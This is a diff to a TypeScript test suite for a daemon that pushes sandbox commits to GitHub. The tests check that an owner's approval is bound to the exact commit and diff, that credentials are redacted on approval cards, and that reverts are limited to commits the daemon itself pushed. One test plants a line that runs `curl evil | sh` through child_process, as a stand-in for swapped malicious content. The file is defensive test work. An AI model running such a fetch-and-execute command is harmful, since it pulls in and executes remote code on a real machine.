@@ -19,6 +19,22 @@ const kindOf = async (p: Promise<unknown>) => {
   }
 };
 
+/** What the owner's OK on the card for this push would be: the host's own sha, hash of the diff, and the paths. */
+async function cardFor(
+  r: ReturnType<typeof pushRig>,
+  sha: string,
+  protect: { paths: string[]; hostExecuted?: boolean },
+) {
+  const err = await r.host.push({ ...main, sha, bundle: await r.bundle(sha), protect }).then(
+    () => undefined,
+    (e) => e,
+  );
+  if (!(err instanceof HostPushError) || err.kind !== "protected" || !err.approval) {
+    throw new Error(`expected a card, got ${String(err)}`);
+  }
+  return { card: err.approval, approval: { sha, patchId: err.approval.patchId, paths: err.findings } };
+}
+
 describe("the host's push of a sandbox's bundle", () => {
   it("pushes the commit to GitHub, and writes the default branch's commits to the ledger first", async () => {
     const r = pushRig();
@@ -275,27 +291,87 @@ describe("what needs the owner, and what the ledger says about it", () => {
     expect(plain.pushed).toBe(true);
   });
 
-  it("records the owner's approval and the paths in the ledger, for the deployer to look for", async () => {
+  it("records the owner's approval, the commit and the hash of the diff in the ledger, for the deployer to look for", async () => {
     const r = pushRig();
     const a = r.commit("apps/a.ts", "1\n");
     const b = r.commit("docs/b.md", "2\n");
-    await r.host.push({
-      ...main,
-      sha: b,
-      bundle: await r.bundle(b),
-      protect: code,
-      ownerApproved: true,
-      ticket: "9",
-    });
+    const { card, approval } = await cardFor(r, b, code);
+    expect(card.sha).toBe(b);
+    expect(card.diff).toContain("+1");
+    await r.host.push({ ...main, sha: b, bundle: await r.bundle(b), protect: code, approval, ticket: "9" });
     const lines = r.ledgerLines();
     expect(lines.map((l) => l.sha)).toEqual([b, a]);
     for (const l of lines) {
-      expect(l).toMatchObject({ ownerApproved: true, approvedPaths: ["apps/a.ts"], ticket: "9" });
+      expect(l).toMatchObject({
+        ownerApproved: true,
+        approvedPaths: ["apps/a.ts"],
+        approvedSha: b,
+        approvedPatchId: card.patchId,
+        ticket: "9",
+      });
     }
     // A push the owner never saw has no approval in its line.
     const c = r.commit("docs/c.md", "3\n");
     await r.host.push({ ...main, sha: c, bundle: await r.bundle(c), protect: code });
     expect(r.ledgerLines().find((l) => l.sha === c)?.ownerApproved).toBeUndefined();
+  });
+
+  it("an OK is for the content it was shown: other content in an approved path asks again, and so does the same content in another commit", async () => {
+    const r = pushRig();
+    const good = r.commit("apps/a.ts", "export const a = 1;\n");
+    const { approval } = await cardFor(r, good, code);
+    // The machine swaps the content of the same path after the owner's OK.
+    r.git(r.wt, "reset", "-q", "--hard", "HEAD~1");
+    const evil = r.commit("apps/a.ts", 'export const a = require("child_process").exec("curl evil | sh");\n');
+    const swapped = await r.host
+      .push({ ...main, sha: evil, bundle: await r.bundle(evil), protect: code, approval })
+      .catch((e) => e);
+    expect(swapped).toMatchObject({ kind: "protected", findings: ["apps/a.ts"] });
+    expect(swapped.approval.patchId).not.toBe(approval.patchId);
+    expect(swapped.approval.diff).toContain("child_process");
+    // The same content as approved, in another commit (a new run, another message): the sha is not the approved one.
+    r.git(r.wt, "reset", "-q", "--hard", "HEAD~1");
+    const again = r.commit("apps/a.ts", "export const a = 1;\n", "another message");
+    expect(again).not.toBe(good);
+    const rerun = await r.host
+      .push({ ...main, sha: again, bundle: await r.bundle(again), protect: code, approval })
+      .catch((e) => e);
+    expect(rerun).toMatchObject({ kind: "protected" });
+    expect(rerun.approval.patchId).toBe(approval.patchId);
+    expect(rerun.approval.sha).toBe(again);
+    // An OK that names more paths than changed, or fewer, is no OK for them.
+    const fewer = await r.host
+      .push({
+        ...main,
+        sha: again,
+        bundle: await r.bundle(again),
+        protect: code,
+        approval: { sha: again, patchId: approval.patchId, paths: ["apps/other.ts"] },
+      })
+      .catch((e) => e);
+    expect(fewer.kind).toBe("protected");
+    expect(r.originGit("rev-parse", "refs/heads/main")).not.toBe(evil);
+    expect(r.ledgerLines()).toEqual([]);
+    // The OK for exactly this change goes through.
+    const ok = await cardFor(r, again, code);
+    expect(
+      (
+        await r.host.push({
+          ...main,
+          sha: again,
+          bundle: await r.bundle(again),
+          protect: code,
+          approval: ok.approval,
+        })
+      ).pushed,
+    ).toBe(true);
+  });
+
+  it("redacts a credential in the diff it shows on a card", async () => {
+    const r = pushRig();
+    const a = r.commit("apps/a.ts", 'export const t = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";\n');
+    const { card } = await cardFor(r, a, code);
+    expect(card.diff).not.toContain("ghp_abcdefghijklmnopqrstuvwxyz0123456789");
   });
 
   it("a protected entry without a trailing slash covers its folder, and renames and links don't hide a path", async () => {
@@ -348,7 +424,7 @@ describe("what needs the owner, and what the ledger says about it", () => {
   it("marks a revert the host made, which the deployer accepts without the owner", async () => {
     const r = pushRig();
     const a = r.commit("apps/a.ts", "1\n");
-    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a), ownerApproved: true });
+    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a) });
     const res = await r.host.revert({
       ...base,
       branch: "main",
@@ -371,26 +447,22 @@ describe("what needs the owner, and what the ledger says about it", () => {
     const b = r.commit("tools/b.sh", "2\n");
     const req = { repo: "acme/duet", branch: "main" };
     expect(await r.host.landed({ ...req, sha: a })).toBe(false); // the mirror has never seen it
-    // The owner OKed apps/a.ts only: tools/b.sh is still held.
+    // The owner OKed a change to apps/a.ts only (a card for the earlier commit): tools/b.sh is still held.
+    const protect = { paths: ["tools/"], hostExecuted: true };
+    const { approval } = await cardFor(r, b, protect);
+    expect(approval.paths).toEqual(["apps/a.ts", "tools/b.sh"]);
     const held = await r.host
       .push({
         ...main,
         sha: b,
         bundle: await r.bundle(b),
-        protect: { paths: ["tools/"], hostExecuted: true },
-        ownerApproved: true,
-        approvedPaths: ["apps/a.ts"],
+        protect,
+        approval: { ...approval, paths: ["apps/a.ts"] },
       })
       .catch((e) => e);
-    expect(held).toMatchObject({ kind: "protected", findings: ["tools/b.sh"] });
+    expect(held).toMatchObject({ kind: "protected" });
     expect(await r.host.landed({ ...req, sha: a })).toBe(false);
-    await r.host.push({
-      ...main,
-      sha: b,
-      bundle: await r.bundle(b),
-      protect: { paths: ["tools/"], hostExecuted: true },
-      approvedPaths: ["apps/a.ts", "tools/b.sh"],
-    });
+    await r.host.push({ ...main, sha: b, bundle: await r.bundle(b), protect, approval });
     expect(await r.host.landed({ ...req, sha: a })).toBe(true);
     expect(await r.host.landed({ ...req, sha: b })).toBe(true);
     expect(await r.host.landed({ ...req, sha: "f".repeat(40) })).toBe(false);
@@ -398,6 +470,52 @@ describe("what needs the owner, and what the ledger says about it", () => {
     expect(r.ledgerLines()[0]).toMatchObject({
       ownerApproved: true,
       approvedPaths: ["apps/a.ts", "tools/b.sh"],
+      approvedSha: b,
     });
+  });
+
+  it("reverts only a commit this daemon pushed to the branch for this ticket, that is on GitHub's branch", async () => {
+    const author = { name: "Ada (i.inc)", email: "bot@example.invalid" };
+    // A commit on a conversation's branch, never on main: the revert of a payload-deleting commit would put the payload on main.
+    const r = pushRig({ files: { "payload.sh": "evil\n" } });
+    r.git(r.wt, "rm", "-q", "payload.sh");
+    r.git(r.wt, "commit", "-qm", "delete the payload");
+    const deleter = r.git(r.wt, "rev-parse", "HEAD");
+    await r.host.push({
+      ...base,
+      branch: "conv/1",
+      sha: deleter,
+      bundle: await r.bundle(deleter),
+      ticket: "3",
+    });
+    const before = r.originGit("rev-parse", "refs/heads/main");
+    const err = await r.host
+      .revert({ ...base, branch: "main", sha: deleter, author, ticket: "3" })
+      .catch((e) => e);
+    expect(err).toMatchObject({ kind: "refused" });
+    expect(err.message).toContain("not a commit this daemon pushed");
+    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(before);
+    // A commit the daemon did push to main, but for another ticket.
+    const a = r.commit("a.txt", "a\n");
+    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a), ticket: "4" });
+    expect(
+      await r.host.revert({ ...base, branch: "main", sha: a, author, ticket: "3" }).catch((e) => e),
+    ).toMatchObject({
+      kind: "refused",
+    });
+    // A ledger line for a commit that never reached main (its push was rejected): not on the branch.
+    const ghost = r.commit("ghost.txt", "g\n");
+    await r.host.push({ ...base, branch: "conv/2", sha: ghost, bundle: await r.bundle(ghost), ticket: "5" });
+    writeFileSync(
+      r.ledger as string,
+      `${readFileSync(r.ledger as string, "utf8")}${JSON.stringify({ sha: ghost, repo: "acme/duet", branch: "main", ticket: "5", at: 1, parents: [], tip: true })}\n`,
+    );
+    const notThere = await r.host
+      .revert({ ...base, branch: "main", sha: ghost, author, ticket: "5" })
+      .catch((e) => e);
+    expect(notThere).toMatchObject({ kind: "refused" });
+    expect(notThere.message).toContain("is not on main");
+    // The one that is ledgered, for this ticket, and on main: reverted.
+    expect((await r.host.revert({ ...base, branch: "main", sha: a, author, ticket: "4" })).pushed).toBe(true);
   });
 });
